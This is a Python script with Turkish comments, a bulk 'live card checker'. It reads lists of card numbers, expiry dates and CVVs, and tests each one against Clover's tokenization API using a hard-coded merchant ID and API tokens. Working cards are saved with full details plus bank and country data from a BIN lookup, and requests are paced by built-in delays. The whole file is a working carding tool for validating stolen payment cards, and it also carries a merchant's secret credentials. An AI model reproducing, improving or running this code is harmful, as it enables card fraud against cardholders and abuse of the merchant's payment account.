#!/usr/bin/env python3
"""
LIVE CARD CHECKER - Clover Token API + Detaylı BIN Check
- Toplu kartları txt'den okur
- Clover Token API ile doğrular
- Detaylı BIN bilgileri (Brand/Type/Level)
- Live kartlar live.txt'ye yazar
"""

import requests
import time
import os
import json
import base64
import re
from datetime import datetime
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

# ====================== KONFİGÜRASYON ======================
INPUT_FILE = "output.txt"                      # Kaynak dosya
OUTPUT_FILE = "live.txt"                      # Live kartların yazılacağı dosya
BATCH_SIZE = 20                               # Batch başına kart sayısı
TIMEOUT = 15                                  # Request timeout
DELAY_BETWEEN_BATCHES = 3                     # Batch arası bekleme
DELAY_BETWEEN_REQUESTS = 1.5                  # Her istek arası bekleme
MAX_RETRIES = 2                               # Maksimum deneme sayısı

# ====================== CLOVER TOKEN API ======================
CLOVER_TOKEN_URL = "https://token.clover.com/v1/tokens"

CLOVER_MERCHANT_ID = "518993421163932"
CLOVER_ECOMM_PUBLIC_TOKEN = "cc5f1f800dad9399d3e46aca8da49d8f"
CLOVER_ECOMM_PRIVATE_TOKEN = "c7ee250b-e9ae-ab59-ba52-616ecc63ed29"

CLOVER_HEADERS = {
    "Content-Type": "application/json",
    "apikey": CLOVER_ECOMM_PUBLIC_TOKEN,
    "Authorization": f"Bearer {CLOVER_ECOMM_PRIVATE_TOKEN}",
    "Accept": "application/json"
}

# ====================== BIN VERİTABANI ======================
BIN_API_URL = "https://lookup.binlist.net/"
BIN_CACHE = {}

# ====================== BIN DETAY MAPPING ======================
# https://en.wikipedia.org/wiki/Payment_card_number
BIN_BRAND_MAP = {
    '4': 'Visa',
    '5': 'Mastercard',
    '2': 'Mastercard',
    '34': 'American Express',
    '37': 'American Express',
    '36': 'Diners Club',
    '38': 'Diners Club',
    '39': 'Diners Club',
    '30': 'Diners Club',
    '35': 'JCB',
    '60': 'Discover',
    '62': 'Discover',
    '64': 'Discover',
    '65': 'Discover',
    '67': 'Discover',
    '50': 'Maestro',
    '56': 'Maestro',
    '57': 'Maestro',
    '58': 'Maestro',
    '59': 'Maestro',
    '63': 'Maestro',
    '66': 'Maestro',
    '68': 'Maestro',
    '69': 'Maestro',
    '70': 'Maestro',
}

BIN_LEVEL_MAP = {
    'platinum': 'Platinum',
    'gold': 'Gold',
    'titanium': 'Titanium',
    'world': 'World',
    'world elite': 'World Elite',
    'signature': 'Signature',
    'infinite': 'Infinite',
    'black': 'Black',
    'centurion': 'Centurion',
    'classic': 'Classic',
    'standard': 'Standard',
    'business': 'Business',
    'corporate': 'Corporate',
    'premium': 'Premium',
    'select': 'Select',
}

BIN_TYPE_MAP = {
    'credit': 'Credit',
    'debit': 'Debit',
    'charge': 'Charge',
    'prepaid': 'Prepaid',
}

# ====================== ANA FONKSİYONLAR ======================

def print_header():
    print("\n" + "=" * 80)
    print("   🔥 CLOVER TOKEN API + DETAYLI BIN CHECK 🔥")
    print("=" * 80)
    print(f"   📁 Input:  {INPUT_FILE}")
    print(f"   📁 Output: {OUTPUT_FILE}")
    print(f"   📦 Batch:  {BATCH_SIZE} kart/batch")
    print(f"   ⏱️  Delay:  {DELAY_BETWEEN_REQUESTS}s / request")
    print(f"   🏪 Merchant: {CLOVER_MERCHANT_ID}")
    print("=" * 80 + "\n")

def read_cards(filename: str) -> List[str]:
    """Dosyadan kartları okur"""
    if not os.path.exists(filename):
        print(f"[!] HATA: {filename} bulunamadı!")
        return []
    
    cards = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                cards.append(line)
    
    print(f"[+] {len(cards)} kart okundu: {filename}")
    return cards

def get_bin_info_detailed(pan: str) -> Dict:
    """
    Detaylı BIN bilgileri çeker
    Brand, Type, Level, Bank, Country bilgilerini doldurur
    """
    try:
        bin_prefix = pan[:6]
        
        # Önbellekten kontrol et
        if bin_prefix in BIN_CACHE:
            return BIN_CACHE[bin_prefix]
        
        # BIN API'den al
        response = requests.get(
            f"{BIN_API_URL}{bin_prefix}",
            timeout=5
        )
        
        result = {
            "brand": "UNKNOWN",
            "type": "UNKNOWN",
            "level": "UNKNOWN",
            "bank": "UNKNOWN",
            "country": "UNKNOWN",
            "currency": "USD",
            "bin": bin_prefix,
            "display": "UNKNOWN|UNKNOWN|UNKNOWN"
        }
        
        if response.status_code == 200:
            data = response.json()
            
            # Brand
            brand = data.get("brand", "").upper()
            if not brand or brand == "UNKNOWN":
                # Kart numarasına göre tahmin
                brand = guess_brand(pan)
            result["brand"] = brand
            
            # Type
            card_type = data.get("type", "").upper()
            if not card_type or card_type == "UNKNOWN":
                card_type = guess_type(pan, data)
            result["type"] = card_type
            
            # Level
            level = data.get("level", "").upper()
            if not level or level == "UNKNOWN":
                level = guess_level(data)
            result["level"] = level
            
            # Bank
            bank = data.get("bank", {}).get("name", "UNKNOWN")
            result["bank"] = bank
            
            # Country
            country = data.get("country", {}).get("name", "UNKNOWN")
            result["country"] = country
            
            # Currency
            result["currency"] = data.get("country", {}).get("currency", "USD")
            
        else:
            # API çalışmazsa tahmin et
            brand = guess_brand(pan)
            result["brand"] = brand
            result["type"] = "UNKNOWN"
            result["level"] = "UNKNOWN"
        
        # Display formatı: Brand|Type|Level
        result["display"] = f"{result['brand']}|{result['type']}|{result['level']}"
        
        # Önbelleğe al
        BIN_CACHE[bin_prefix] = result
        return result
        
    except Exception as e:
        # Hata durumunda tahmin et
        brand = guess_brand(pan)
        result = {
            "brand": brand,
            "type": "UNKNOWN",
            "level": "UNKNOWN",
            "bank": "UNKNOWN",
            "country": "UNKNOWN",
            "currency": "USD",
            "bin": pan[:6],
            "display": f"{brand}|UNKNOWN|UNKNOWN"
        }
        BIN_CACHE[pan[:6]] = result
        return result

def guess_brand(pan: str) -> str:
    """Kart numarasına göre brand tahmini"""
    if not pan:
        return "UNKNOWN"
    
    # İlk 2-4 haneye göre
    prefix2 = pan[:2]
    prefix4 = pan[:4]
    
    # American Express
    if prefix4 in ['34', '37']:
        return "AMEX"
    
    # Diners Club
    if prefix4 in ['36', '38', '39'] or pan[:3] in ['300', '301', '302', '303', '304', '305']:
        return "DINERS"
    
    # JCB
    if prefix4 in ['35']:
        return "JCB"
    
    # Discover
    if prefix4 in ['6011', '6221', '6222', '6223', '6224', '6225', '6226', '6227', '6228', '6229',
                   '644', '645', '646', '647', '648', '649', '65']:
        return "DISCOVER"
    
    # Maestro
    if prefix2 in ['50', '56', '57', '58', '59', '63', '66', '67', '68', '69']:
        return "MAESTRO"
    
    # Visa
    if pan.startswith('4'):
        return "VISA"
    
    # Mastercard (2 veya 5 ile başlayan)
    if pan.startswith('5') or pan.startswith('2'):
        return "MASTERCARD"
    
    return "UNKNOWN"

def guess_type(pan: str, data: Dict = None) -> str:
    """Kart tipi tahmini"""
    # API'den geldiyse
    if data:
        card_type = data.get("type", "")
        if card_type:
            return card_type.upper()
    
    # Kart numarasına göre
    if len(pan) == 15 and (pan.startswith('34') or pan.startswith('37')):
        return "CREDIT"
    
    if len(pan) == 16:
        if pan.startswith('4') or pan.startswith('5'):
            return "CREDIT"
        elif pan.startswith('6'):
            return "CREDIT"
    
    return "UNKNOWN"

def guess_level(data: Dict) -> str:
    """Kart seviyesi tahmini"""
    if not data:
        return "UNKNOWN"
    
    # API'den gelen level
    level = data.get("level", "")
    if level:
        return level.upper()
    
    # Verilerden tahmin et
    brand = data.get("brand", "").lower()
    card_type = data.get("type", "").lower()
    
    # Platinum
    if 'platinum' in str(data).lower():
        return "PLATINUM"
    
    # Gold
    if 'gold' in str(data).lower():
        return "GOLD"
    
    # Infinite
    if 'infinite' in str(data).lower():
        return "INFINITE"
    
    # Signature
    if 'signature' in str(data).lower():
        return "SIGNATURE"
    
    # World Elite
    if 'world elite' in str(data).lower():
        return "WORLD_ELITE"
    
    # World
    if 'world' in str(data).lower():
        return "WORLD"
    
    # Business
    if 'business' in str(data).lower():
        return "BUSINESS"
    
    # Classic
    if 'classic' in str(data).lower():
        return "CLASSIC"
    
    return "STANDARD"

def format_card_for_clover(card_str: str) -> Optional[Dict]:
    """Kart string'ini Clover Token API formatına dönüştür"""
    parts = card_str.split("|")
    
    try:
        if len(parts) >= 4:
            pan = parts[0].strip()
            month = parts[1].strip().zfill(2)
            year = parts[2].strip()
            cvv = parts[3].strip()
            
            if len(year) == 2:
                year = f"20{year}"
            
            return {
                "number": pan,
                "exp_month": month,
                "exp_year": year,
                "cvv": cvv,
                "original": card_str,
                "pan": pan
            }
        elif len(parts) == 3:
            pan = parts[0].strip()
            expiry = parts[1].strip()
            cvv = parts[2].strip()
            
            if "/" in expiry:
                exp_parts = expiry.split("/")
                month = exp_parts[0].strip().zfill(2)
                year = exp_parts[1].strip()
                if len(year) == 2:
                    year = f"20{year}"
            elif len(expiry) == 4 and expiry.isdigit():
                month = expiry[:2]
                year = f"20{expiry[2:]}"
            else:
                return None
            
            return {
                "number": pan,
                "exp_month": month,
                "exp_year": year,
                "cvv": cvv,
                "original": card_str,
                "pan": pan
            }
    except:
        pass
    
    return None

def verify_card_with_clover(card_data: Dict) -> Dict:
    """Clover Token API ile kart doğrulama"""
    start_time = time.time()
    
    try:
        payload = {
            "card": {
                "number": card_data["number"],
                "exp_month": card_data["exp_month"],
                "exp_year": card_data["exp_year"],
                "cvv": card_data["cvv"]
            }
        }
        
        response = requests.post(
            CLOVER_TOKEN_URL,
            json=payload,
            headers=CLOVER_HEADERS,
            timeout=TIMEOUT
        )
        
        elapsed = time.time() - start_time
        
        result = {
            "success": False,
            "live": False,
            "status_code": response.status_code,
            "elapsed": f"{elapsed:.2f}s",
            "original": card_data["original"],
            "card_number": card_data["number"],
            "pan": card_data["pan"],
            "token": None,
            "message": ""
        }
        
        # BIN bilgisini al
        bin_info = get_bin_info_detailed(card_data["number"])
        result.update(bin_info)
        
        if response.status_code == 200:
            try:
                data = response.json()
                result["success"] = True
                result["live"] = True
                result["token"] = data.get("id", "")
                result["message"] = "Card verified successfully"
                
            except json.JSONDecodeError:
                result["success"] = False
                result["live"] = False
                result["message"] = "Invalid JSON response"
        
        elif response.status_code == 204:
            result["success"] = False
            result["live"] = False
            result["message"] = "Card verification failed"
            
        elif response.status_code == 402:
            result["success"] = False
            result["live"] = False
            result["message"] = "Card declined"
            
        elif response.status_code == 400:
            result["success"] = False
            result["live"] = False
            result["message"] = "Invalid card details"
            
            if response.text:
                try:
                    error_data = response.json()
                    if "message" in error_data:
                        result["message"] = error_data["message"]
                except:
                    pass
        
        elif response.status_code == 401:
            result["success"] = False
            result["live"] = False
            result["message"] = "Authentication failed"
        
        else:
            result["success"] = False
            result["live"] = False
            result["message"] = f"HTTP {response.status_code}"
        
        return result
        
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "live": False,
            "status": "TIMEOUT",
            "message": f"Timeout ({TIMEOUT}s)",
            "elapsed": f"{time.time() - start_time:.2f}s",
            "original": card_data["original"],
            "card_number": card_data["number"],
            "pan": card_data["pan"],
            "token": None,
            "brand": "UNKNOWN",
            "type": "UNKNOWN",
            "level": "UNKNOWN",
            "bank": "UNKNOWN",
            "country": "UNKNOWN",
            "display": "UNKNOWN|UNKNOWN|UNKNOWN"
        }
    except Exception as e:
        return {
            "success": False,
            "live": False,
            "status": "ERROR",
            "message": str(e)[:100],
            "elapsed": f"{time.time() - start_time:.2f}s",
            "original": card_data["original"],
            "card_number": card_data["number"],
            "pan": card_data["pan"],
            "token": None,
            "brand": "UNKNOWN",
            "type": "UNKNOWN",
            "level": "UNKNOWN",
            "bank": "UNKNOWN",
            "country": "UNKNOWN",
            "display": "UNKNOWN|UNKNOWN|UNKNOWN"
        }

def save_live_card(card_str: str, result: Dict):
    """Live kartı dosyaya kaydeder - Detaylı BIN bilgileriyle"""
    if os.path.exists(OUTPUT_FILE):
        with open(OUTPUT_FILE, 'r', encoding='utf-8') as f:
            existing = f.read()
            pan = card_str.split('|')[0]
            if pan in existing:
                return False
    
    # Detaylı BIN bilgileri
    brand = result.get("brand", "UNKNOWN")
    card_type = result.get("type", "UNKNOWN")
    level = result.get("level", "UNKNOWN")
    bank = result.get("bank", "UNKNOWN")
    country = result.get("country", "UNKNOWN")
    token = result.get("token", "N/A")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Format: pan|mm|yy|cvv|brand|type|level|bank|country|token|timestamp
    live_line = f"{card_str}|{brand}|{card_type}|{level}|{bank}|{country}|{token}|{timestamp}"
    
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        f.write(live_line + '\n')
    
    return True

def process_single_card(card_str: str, idx: int, total: int) -> Dict:
    """Tek bir kartı işle"""
    
    card_data = format_card_for_clover(card_str)
    if not card_data:
        print(f"\n   [{idx}/{total}] ❌ FORMAT ERROR | {card_str[:30]}")
        return {
            "success": False,
            "live": False,
            "error": "Format error",
            "original": card_str
        }
    
    pan_display = f"{card_data['number'][:6]}****{card_data['number'][-4:]}"
    exp_display = f"{card_data['exp_month']}/{card_data['exp_year']}"
    cvv_display = card_data.get('cvv', 'XXX')
    
    # Kartı doğrula
    result = None
    for attempt in range(MAX_RETRIES):
        result = verify_card_with_clover(card_data)
        
        if result.get("live", False):
            break
        elif attempt < MAX_RETRIES - 1:
            time.sleep(2)
    
    # Sonucu göster
    if result and result.get("live", False):
        brand = result.get("brand", "UNKNOWN")
        card_type = result.get("type", "UNKNOWN")
        level = result.get("level", "UNKNOWN")
        
        saved = save_live_card(card_str, result)
        
        if saved:
            print(f"\n   [{idx}/{total}] {pan_display}|{exp_display}|{cvv_display} ✅ LIVE | {brand}|{card_type}|{level} ✅ KAYDEDİLDİ")
        else:
            print(f"\n   [{idx}/{total}] {pan_display}|{exp_display}|{cvv_display} ✅ LIVE | {brand}|{card_type}|{level} ℹ️ Zaten kayıtlı")
        
        return {
            "success": True,
            "live": True,
            "saved": saved,
            "original": card_str,
            "brand": brand,
            "type": card_type,
            "level": level,
            "token": result.get("token", "N/A")
        }
    elif result:
        brand = result.get("brand", "UNKNOWN")
        card_type = result.get("type", "UNKNOWN")
        level = result.get("level", "UNKNOWN")
        
        print(f"\n   [{idx}/{total}] {pan_display}|{exp_display}|{cvv_display} 💀 DEAD | {brand}|{card_type}|{level} | {result.get('message', '')}")
        
        return {
            "success": False,
            "live": False,
            "original": card_str,
            "message": result.get("message", "Unknown"),
            "brand": brand
        }
    else:
        print(f"\n   [{idx}/{total}] {pan_display}|{exp_display}|{cvv_display} ❌ NO RESULT")
        return {
            "success": False,
            "live": False,
            "original": card_str,
            "error": "No result"
        }

def process_batch_sequential(cards_batch: List[str], batch_num: int, total_batches: int) -> Dict:
    """Batch'i sıralı işle"""
    print(f"\n{'='*80}")
    print(f"📦 BATCH {batch_num}/{total_batches} - {len(cards_batch)} kart")
    print(f"{'='*80}")
    print("   Format: PAN|EXP|CVV | Status | Brand|Type|Level")
    print("-" * 80)
    
    live_count = 0
    already_saved = 0
    dead_count = 0
    error_count = 0
    
    for idx, card_str in enumerate(cards_batch, 1):
        result = process_single_card(card_str, idx, len(cards_batch))
        
        if result.get("live", False):
            if result.get("saved", False):
                live_count += 1
            else:
                already_saved += 1
        elif result.get("success", False):
            dead_count += 1
        else:
            error_count += 1
        
        # Her istek arası delay
        if idx < len(cards_batch):
            time.sleep(DELAY_BETWEEN_REQUESTS)
    
    # Batch özeti
    print(f"\n   📊 BATCH {batch_num} ÖZET:")
    print(f"      ✅ LIVE: {live_count} | 💾 Kayıtlı: {already_saved} | ❌ DEAD: {dead_count} | ⚠️ HATA: {error_count}")
    print(f"      📈 Başarı: {((live_count + already_saved)/len(cards_batch)*100):.1f}%" if len(cards_batch) > 0 else "0%")
    
    return {
        "live": live_count,
        "already_saved": already_saved,
        "dead": dead_count,
        "errors": error_count
    }

def test_clover_connection():
    """Clover Token API bağlantısını test et"""
    print("\n[+] Clover Token API bağlantısı test ediliyor...")
    
    try:
        test_payload = {
            "card": {
                "number": "4111111111111111",
                "exp_month": "12",
                "exp_year": "2025",
                "cvv": "123"
            }
        }
        
        response = requests.post(
            CLOVER_TOKEN_URL,
            json=test_payload,
            headers=CLOVER_HEADERS,
            timeout=10
        )
        
        print(f"[+] Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"[+] ✅ Token oluştu: {data.get('id', 'N/A')[:20]}...")
            return True
        elif response.status_code in [204, 402, 400]:
            print("[+] ✅ API çalışıyor (test kartı geçersiz)")
            return True
        elif response.status_code == 401:
            print("[!] ❌ Auth başarısız! Token'larınızı kontrol edin.")
            return False
        else:
            print(f"[+] ⚠️ Status {response.status_code} - Devam ediliyor...")
            return True
    except Exception as e:
        print(f"[!] ❌ Hata: {e}")
        return False

def main():
    print_header()
    
    cards = read_cards(INPUT_FILE)
    if not cards:
        print("[!] Hiç kart yok, çıkılıyor...")
        return
    
    if not test_clover_connection():
        print("\n[!] Clover API bağlantısı başarısız!")
        print("[!] Devam etmek istiyor musunuz? (E/H)")
        if input().upper() != "E":
            return
    
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)
        print(f"[+] Eski {OUTPUT_FILE} silindi")
    
    total_batches = (len(cards) + BATCH_SIZE - 1) // BATCH_SIZE
    total_live = 0
    total_already = 0
    total_dead = 0
    total_errors = 0
    start_time = time.time()
    
    for i in range(0, len(cards), BATCH_SIZE):
        batch = cards[i:i+BATCH_SIZE]
        batch_num = (i // BATCH_SIZE) + 1
        
        result = process_batch_sequential(batch, batch_num, total_batches)
        
        total_live += result["live"]
        total_already += result.get("already_saved", 0)
        total_dead += result["dead"]
        total_errors += result["errors"]
        
        if i + BATCH_SIZE < len(cards):
            print(f"\n   ⏳ {DELAY_BETWEEN_BATCHES}s batch arası bekleniyor...")
            time.sleep(DELAY_BETWEEN_BATCHES)
    
    elapsed = time.time() - start_time
    total = len(cards)
    
    print("\n" + "=" * 80)
    print("   📊 TAMAMLANDI!")
    print("=" * 80)
    print(f"   📁 Input:  {total} kart")
    print(f"   💚 LIVE:   {total_live} (yeni kaydedilen)")
    print(f"   💾 Kayıtlı: {total_already} (önceden kaydedilmiş)")
    print(f"   ❌ DEAD:   {total_dead}")
    print(f"   ⚠️ HATA:   {total_errors}")
    print(f"   📈 Oran:   {((total_live + total_already)/total*100):.1f}%" if total > 0 else "0%")
    print(f"   ⏱️ Süre:   {elapsed:.1f}s")
    print(f"   📁 Output: {OUTPUT_FILE}")
    print("=" * 80)

if __name__ == "__main__":
    main()